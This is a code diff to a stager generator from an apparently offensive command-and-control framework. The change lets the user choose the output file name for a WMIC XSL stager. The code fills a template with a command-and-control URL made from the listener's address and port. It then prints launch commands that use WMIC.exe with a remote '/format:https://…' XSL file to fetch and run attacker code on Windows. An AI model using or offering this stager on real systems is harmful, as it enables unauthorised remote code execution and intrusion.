@@ -8,8 +8,11 @@ class STStager:
         self.author = '@byt3bl33d3r'
         self.options = {}
 
-    def generate(self, listener):
-        with open('wmic.xsl', 'w') as stager:
+    def generate(self, listener, filename=None):
+        stager_filename = 'wmic.xsl'
+        if filename is not None:
+            stager_filename = filename
+        with open(stager_filename, 'w') as stager:
             with open('stagers/templates/wmic.xsl') as template:
                 template = template.read()
                 template = template.replace('C2_URL', f"https://{listener['BindIP']}:{listener['Port']}")
@@ -18,5 +21,5 @@ class STStager:
 
                 print_good(f"Generated stager to {stager.name}")
                 print_info("Launch with:")
-                print('\tC:\\Windows\\System32\\wbem\\WMIC.exe os get /format:"https://myurl/wmic.xsl"')
-                print('\tC:\\Windows\\System32\\wbem\\WMIC.exe os get /format:"wmic.xsl"')
+                print(f"\tC:\\Windows\\System32\\wbem\\WMIC.exe os get /format:\"https://myurl/{stager_filename}\"")
+                print(f"\tC:\\Windows\\System32\\wbem\\WMIC.exe os get /format:\"{stager_filename}\"")
